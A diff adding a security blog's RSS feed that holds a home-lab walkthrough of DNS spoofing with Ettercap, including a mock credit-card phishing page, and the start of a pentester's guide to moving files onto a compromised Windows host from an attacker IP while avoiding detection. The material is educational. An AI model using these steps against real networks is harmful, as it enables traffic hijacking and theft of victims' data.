+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;h3&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;YouR CaR&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s ExteNDeD WarraNTy is AlMosT OuT&amp;lt;/h3&amp;gt;  &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;Give me all your PII NOW &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; your identity will be stolen &lt;span style=&#34;color:#f92672&#34;&gt;!!!&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&amp;lt;/&lt;/span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;label &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cc&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;Enter YouR CreDIT CarD Number ASAP &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;ASAP&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;b&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!!&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;label&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;input id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cc&amp;#34;&lt;/span&gt; placeholder&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;or else&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I then changed the ownership of the file to the service account &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo chown www-data ./index.html
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;Start Malicious Web Server&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;p&gt;As stated previously, I’m using Apache, so I just started the&lt;code&gt;apache2&lt;/code&gt; service.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8yqslDbjbDYLIde9DLp0Jw.png&#34; alt=&#34;&#34;  /&gt;
+
+When I visit &lt;code&gt;[http://127.0.0.1/index.html](http://127.0.0.1/index.html,)&lt;/code&gt;, I see my malicious webpage.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*c0hPCdzDnLLWE_0zuWDwtw.png&#34; alt=&#34;&#34;  /&gt;
+
+&lt;em&gt;No one would actually enter their credit card number here… right??&lt;/em&gt;&lt;/p&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;Verify Website is Reachable from Victim Computer&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;p&gt;This is pretty simple. I just visit my Kali IPv4 address in the browser of Windy Runner (my VM) to verify that it can be loaded from the Windows machine.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Bov2hAJHJNLDGy6L-T8Idg.png&#34; alt=&#34;&#34;  /&gt;
+
+As we can see here, I am able to access the webpage. Now we can get to the fun stuff.&lt;/p&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;Configuring Ettercap&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Quick Theory&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Ettercap is being used in this context to resolve DNS queries coming from the victim machine. Ettercap will respond to the DNS query with the IP address of the attacking machine (Kali) such that when the victim visits the target domain, they will be redirected to the attacker&amp;rsquo;s IP address instead of the real IP address associated with the domain name.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Editing etter.conf&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Open up your text editor of choice.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo vim etter.conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The changes to make are shown in green in the screenshot below.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*OC5xz4T3RuZNKlKHAjLlNg.png&#34; alt=&#34;&#34;  /&gt;
+
+&lt;strong&gt;Explanation:&lt;/strong&gt; I set the UID and GID to 0 so that Ettercap has adequate permissions on the machine. In this case, UID and GID 0 are root permissions. I then uncommented lines 179, 180, 183, and 184. The purpose of the &lt;code&gt;redir_commands&lt;/code&gt; is explained best in the &lt;a href=&#34;https://linux.die.net/man/5/etter.conf&#34;&gt;etter.conf man page&lt;/a&gt;:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[P]rovide[s] a valid command (or script) to enable tcp redirection at kernel level in order to be able to use SSL dissection.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Editing etter.dns&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Assuming you&amp;rsquo;re using the default configuration file for &lt;code&gt;etter.dns&lt;/code&gt;, all you need to do is skip to the bottom of the file and add the domain name you intend to spoof, the associated A and PTR records, and your attacking IP address.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo vim /etc/ettercap/etter.dns
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6-get-the-ip-address-of-the-victimmachine&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*KcKAb7OJbz_0f5CoNtpJow.png&#34; alt=&#34;&#34;  /&gt;
+
+6. Get the IP Address of the Victim Machine&lt;/h2&gt;
+&lt;p&gt;I use &lt;code&gt;ipconfig&lt;/code&gt; to get the IPv4 address of the Windows VM.&lt;/p&gt;
+&lt;h2 id=&#34;7-runettercap&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nz7wSTrT_fwsS9C9p12JAA.png&#34; alt=&#34;&#34;  /&gt;
+
+7. Run Ettercap&lt;/h2&gt;
+&lt;p&gt;On my Kali machine, I navigate to Applications &amp;gt; 09 — Sniffing &amp;amp; Spoofing &amp;gt; ettercap-graphical in order to open the ettercap GUI.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*NJo2YFgmY4SD6zkBz7DNpA.png&#34; alt=&#34;&#34;  /&gt;
+
+In the upper-right hand corner, I click on the three dots and navigate to Targets &amp;gt; Select targets.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*m54-jnHr4SRYB0rNDpbzIA.png&#34; alt=&#34;&#34;  /&gt;
+
+&lt;em&gt;I have white theme right now, don’t judge&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;I then enter the IP address of the victim machine and default gateway and press “OK”. The default gateway can also be found in the &lt;code&gt;ifconfig/ipconfig&lt;/code&gt; command output of the victim machine.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*saKkteivYxqf_WJ6vQ6xnQ.png&#34; alt=&#34;&#34;  /&gt;
+
+Click the Earth icon in the upper right-hand corner and select ARP poisoning.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*iA33LttxmEYOcbNGJ57MDA.png&#34; alt=&#34;&#34;  /&gt;
+
+The default setting is okay here.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Hn7A8k11PR6HrcXcRBD14g.png&#34; alt=&#34;&#34;  /&gt;
+
+Then, click the three dots in the corner again. Go to Plugins &amp;gt; Manage plugins.&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*kYuERsIIlgodh6L8wP2RrQ.png&#34; alt=&#34;&#34;  /&gt;
+
+Select &lt;code&gt;dns_spoof&lt;/code&gt; by double-clicking it. You’ll know that you’ve applied the plugin when the asterisk appears to the left of the plugin name.&lt;/p&gt;
+&lt;h2 id=&#34;8-visit-the-domain-on-the-victimmachine&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*tNOBptOwGtIEKMVP-E-qOw.png&#34; alt=&#34;&#34;  /&gt;
+
+8. Visit The Domain on the Victim Machine&lt;/h2&gt;
+&lt;p&gt;Now, we reap the fruits of our labor.&lt;/p&gt;
+&lt;h2 id=&#34;before&#34;&gt;Before&lt;/h2&gt;
+&lt;p&gt;This is the webpage that the victim  to see when visiting ecosia.org:&lt;/p&gt;
+&lt;h2 id=&#34;after&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*K8cS5-Fsf0b97Zt20E-Vjw.png&#34; alt=&#34;&#34;  /&gt;
+
+After&lt;/h2&gt;
+&lt;p&gt;This is the webpage that the victim machine  sees when visiting ecosia.org:&lt;/p&gt;
+&lt;h1 id=&#34;remediation&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*YXQSYdj_RbcymtXs2FOMxg.png&#34; alt=&#34;&#34;  /&gt;
+
+Remediation&lt;/h1&gt;
+&lt;p&gt;Here are some ways to prevent a DNS Cache Poisoning attack (referenced from &lt;a href=&#34;https://kinsta.com/blog/dns-poisoning/&#34;&gt;here&lt;/a&gt;).&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Use spoofing detection tools&lt;/li&gt;
+&lt;li&gt;Have a strong DNS, DHCP, and IPAM (DDI) strategy in place&lt;/li&gt;
+&lt;li&gt;Use Domain Name System Security Extensions (DNSSEC). This essentially adds different levels of verification&lt;/li&gt;
+&lt;li&gt;Use end-to-end encryption for DNS queries&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;more-reading&#34;&gt;More Reading&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning&#34;&gt;https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://kinsta.com/blog/dns-poisoning/&#34;&gt;https://kinsta.com/blog/dns-poisoning/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Thanks for reading!&lt;/p&gt;
+</description>
+      <content:encoded><![CDATA[<h2 id="dns-cache-poisoning-on-home-lab-walkthrough">DNS Cache Poisoning on Home Lab Walkthrough</h2>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*P3ZahJWqz8AFbk9s.png" alt="Basic DNS cache poisoning attack"  />
+
+<em><a href="https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png">https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png</a></em></p>
+<h1 id="overview">Overview</h1>
+<p>In this article, I will be walking you through a common method of implementing DNS cache poisoning on a network. I’ll illustrate my process with screenshots, commands, and explanations. You are welcome to follow along and gain hands-on experience with DNS spoofing to further reinforce the knowledge that you already have.</p>
+<h2 id="intended-audience">Intended Audience</h2>
+<p>This is intended for a more technical audience. If you’re a beginner, I recommend looking for a more comprehensive tutorial to walk you through all the terminology and commands. For the purposes of this article, I’m assuming that you already have a foundational understanding of Linux, DNS, virtual machines, and potentially troubleshooting. I will not be explaining how DNS cache poisoning works. For more information, you may read the articles linked in the “More Reading” section at the end of this post.</p>
+<h2 id="tools-used">Tools Used</h2>
+<ul>
+<li>Windows VM</li>
+<li>Kali VM</li>
+<li>Ettercap</li>
+<li>Text editor</li>
+</ul>
+<p>You will also need root/system privileges or sudo abilities on the attacking machine.</p>
+<h1 id="practical-demonstration">Practical Demonstration</h1>
+<ol>
+<li>Find the IP address of your attacker machine</li>
+</ol>
+<hr>
+<p>Since I’m doing this on my LAN, I can use my private IPv4 address, which I truncated from the <code>ifconfig</code> command for the purpose of this demonstration.</p>
+<h2 id="2-create-the-landing-page-of-your-malicious-website"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*UY_WaZN3PluXBghyE4c0nA.png" alt=""  />
+
+2. Create the landing page of your malicious website</h2>
+<p>Now, we’ll prepare the HTML file that the victim will encounter once the DNS has been spoofed. Since I’m using an Apache webserver, I’ll place the file in the root directory on my machine, which is <code>/var/www/html</code>. This is my file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌──</span>(ally<span style="color:#960050;background-color:#1e0010">㉿</span>kali)<span style="color:#f92672">-</span>[<span style="color:#f92672">/</span><span style="color:#66d9ef">var</span><span style="color:#f92672">/</span>www<span style="color:#f92672">/</span>html]  
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─</span><span style="color:#f92672">$</span> cat index<span style="color:#f92672">.</span>html   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>title<span style="color:#f92672">&gt;</span>No More Planting Trees<span style="color:#f92672">&lt;/</span>title<span style="color:#f92672">&gt;</span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>h1<span style="color:#f92672">&gt;</span>No More Planting Trees<span style="color:#f92672">&lt;/</span>h1<span style="color:#f92672">&gt;</span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>h3<span style="color:#f92672">&gt;</span>YouR CaR<span style="color:#e6db74">&#39;s ExteNDeD WarraNTy is AlMosT OuT&lt;/h3&gt;  </span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>p<span style="color:#f92672">&gt;</span>Give me all your PII NOW <span style="color:#f92672">or</span> <span style="color:#66d9ef">else</span> your identity will be stolen <span style="color:#f92672">!!!</span> <span style="color:#f92672">!!&lt;/</span>p<span style="color:#f92672">&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>form<span style="color:#f92672">&gt;</span>  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>label <span style="color:#66d9ef">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cc&#34;</span><span style="color:#f92672">&gt;</span>Enter YouR CreDIT CarD Number ASAP <span style="color:#f92672">&lt;</span>b<span style="color:#f92672">&gt;</span>ASAP<span style="color:#f92672">&lt;/</span>b<span style="color:#f92672">&gt;</span> <span style="color:#f92672">!!</span>:<span style="color:#f92672">&lt;/</span>label<span style="color:#f92672">&gt;</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">&lt;</span>input id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cc&#34;</span> placeholder<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;or else&#34;</span> <span style="color:#f92672">/&gt;</span>  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>form<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>I then changed the ownership of the file to the service account <code>www-data</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo chown www-data ./index.html
+</span></span></code></pre></div><ol start="3">
+<li>Start Malicious Web Server</li>
+</ol>
+<hr>
+<p>As stated previously, I’m using Apache, so I just started the<code>apache2</code> service.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*8yqslDbjbDYLIde9DLp0Jw.png" alt=""  />
+
+When I visit <code>[http://127.0.0.1/index.html](http://127.0.0.1/index.html,)</code>, I see my malicious webpage.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*c0hPCdzDnLLWE_0zuWDwtw.png" alt=""  />
+
+<em>No one would actually enter their credit card number here… right??</em></p>
+<ol start="4">
+<li>Verify Website is Reachable from Victim Computer</li>
+</ol>
+<hr>
+<p>This is pretty simple. I just visit my Kali IPv4 address in the browser of Windy Runner (my VM) to verify that it can be loaded from the Windows machine.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Bov2hAJHJNLDGy6L-T8Idg.png" alt=""  />
+
+As we can see here, I am able to access the webpage. Now we can get to the fun stuff.</p>
+<ol start="5">
+<li>Configuring Ettercap</li>
+</ol>
+<hr>
+<p><strong>Quick Theory</strong></p>
+<p>Ettercap is being used in this context to resolve DNS queries coming from the victim machine. Ettercap will respond to the DNS query with the IP address of the attacking machine (Kali) such that when the victim visits the target domain, they will be redirected to the attacker&rsquo;s IP address instead of the real IP address associated with the domain name.</p>
+<p><strong>Editing etter.conf</strong></p>
+<p>Open up your text editor of choice.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo vim etter.conf
+</span></span></code></pre></div><p>The changes to make are shown in green in the screenshot below.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*OC5xz4T3RuZNKlKHAjLlNg.png" alt=""  />
+
+<strong>Explanation:</strong> I set the UID and GID to 0 so that Ettercap has adequate permissions on the machine. In this case, UID and GID 0 are root permissions. I then uncommented lines 179, 180, 183, and 184. The purpose of the <code>redir_commands</code> is explained best in the <a href="https://linux.die.net/man/5/etter.conf">etter.conf man page</a>:</p>
+<blockquote>
+<p>[P]rovide[s] a valid command (or script) to enable tcp redirection at kernel level in order to be able to use SSL dissection.</p>
+</blockquote>
+<p><strong>Editing etter.dns</strong></p>
+<p>Assuming you&rsquo;re using the default configuration file for <code>etter.dns</code>, all you need to do is skip to the bottom of the file and add the domain name you intend to spoof, the associated A and PTR records, and your attacking IP address.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo vim /etc/ettercap/etter.dns
+</span></span></code></pre></div><h2 id="6-get-the-ip-address-of-the-victimmachine"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*KcKAb7OJbz_0f5CoNtpJow.png" alt=""  />
+
+6. Get the IP Address of the Victim Machine</h2>
+<p>I use <code>ipconfig</code> to get the IPv4 address of the Windows VM.</p>
+<h2 id="7-runettercap"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*nz7wSTrT_fwsS9C9p12JAA.png" alt=""  />
+
+7. Run Ettercap</h2>
+<p>On my Kali machine, I navigate to Applications &gt; 09 — Sniffing &amp; Spoofing &gt; ettercap-graphical in order to open the ettercap GUI.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*NJo2YFgmY4SD6zkBz7DNpA.png" alt=""  />
+
+In the upper-right hand corner, I click on the three dots and navigate to Targets &gt; Select targets.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*m54-jnHr4SRYB0rNDpbzIA.png" alt=""  />
+
+<em>I have white theme right now, don’t judge</em></p>
+<p>I then enter the IP address of the victim machine and default gateway and press “OK”. The default gateway can also be found in the <code>ifconfig/ipconfig</code> command output of the victim machine.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*saKkteivYxqf_WJ6vQ6xnQ.png" alt=""  />
+
+Click the Earth icon in the upper right-hand corner and select ARP poisoning.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*iA33LttxmEYOcbNGJ57MDA.png" alt=""  />
+
+The default setting is okay here.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Hn7A8k11PR6HrcXcRBD14g.png" alt=""  />
+
+Then, click the three dots in the corner again. Go to Plugins &gt; Manage plugins.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*kYuERsIIlgodh6L8wP2RrQ.png" alt=""  />
+
+Select <code>dns_spoof</code> by double-clicking it. You’ll know that you’ve applied the plugin when the asterisk appears to the left of the plugin name.</p>
+<h2 id="8-visit-the-domain-on-the-victimmachine"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*tNOBptOwGtIEKMVP-E-qOw.png" alt=""  />
+
+8. Visit The Domain on the Victim Machine</h2>
+<p>Now, we reap the fruits of our labor.</p>
+<h2 id="before">Before</h2>
+<p>This is the webpage that the victim  to see when visiting ecosia.org:</p>
+<h2 id="after"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*K8cS5-Fsf0b97Zt20E-Vjw.png" alt=""  />
+
+After</h2>
+<p>This is the webpage that the victim machine  sees when visiting ecosia.org:</p>
+<h1 id="remediation"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*YXQSYdj_RbcymtXs2FOMxg.png" alt=""  />
+
+Remediation</h1>
+<p>Here are some ways to prevent a DNS Cache Poisoning attack (referenced from <a href="https://kinsta.com/blog/dns-poisoning/">here</a>).</p>
+<ol>
+<li>Use spoofing detection tools</li>
+<li>Have a strong DNS, DHCP, and IPAM (DDI) strategy in place</li>
+<li>Use Domain Name System Security Extensions (DNSSEC). This essentially adds different levels of verification</li>
+<li>Use end-to-end encryption for DNS queries</li>
+</ol>
+<h1 id="more-reading">More Reading</h1>
+<ul>
+<li><a href="https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning">https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning</a></li>
+<li><a href="https://kinsta.com/blog/dns-poisoning/">https://kinsta.com/blog/dns-poisoning/</a></li>
+</ul>
+<p>Thanks for reading!</p>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Pentester’s Guide to Performing File Transfers</title>
+      <link>http://localhost:1313/ally-petitt/en/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</link>
+      <pubDate>Wed, 08 Jun 2022 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/ally-petitt/en/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</guid>
+      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HNC0lT4gPMDU8uH0fyjRyw.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;h1 id=&#34;foreword&#34;&gt;Foreword&lt;/h1&gt;
+&lt;p&gt;To avoid detection, it is best to use tools that are native to the victim’s computer.&lt;/p&gt;
+&lt;h1 id=&#34;ftp-with-windowshost&#34;&gt;FTP with Windows Host&lt;/h1&gt;
+&lt;p&gt;While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install vsftpd  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo service vsftpd start  
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;service vsftpd status #status should be active
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To check if your server is working, type &lt;code&gt;ftp localhost.&lt;/code&gt; If you see the message “Connected to localhost”, your FTP server is running.&lt;/p&gt;
+&lt;h2 id=&#34;accessing-file-with-interactive-shell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ehYiaPXjraslOYhNqIv7Zw.png&#34; alt=&#34;&#34;  /&gt;
+
+Accessing File With Interactive Shell&lt;/h2&gt;
+&lt;p&gt;If you have an interactive shell on the Windows machine, run this command.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cscript wget.vbs http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt; &amp;lt;FILENAME TO SAVE AS&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;accessing-file-with-non-interactive-shell&#34;&gt;Accessing File With Non-Interactive Shell&lt;/h2&gt;
+&lt;p&gt;If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;storageDir &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;pwd &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; wget&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ps1  
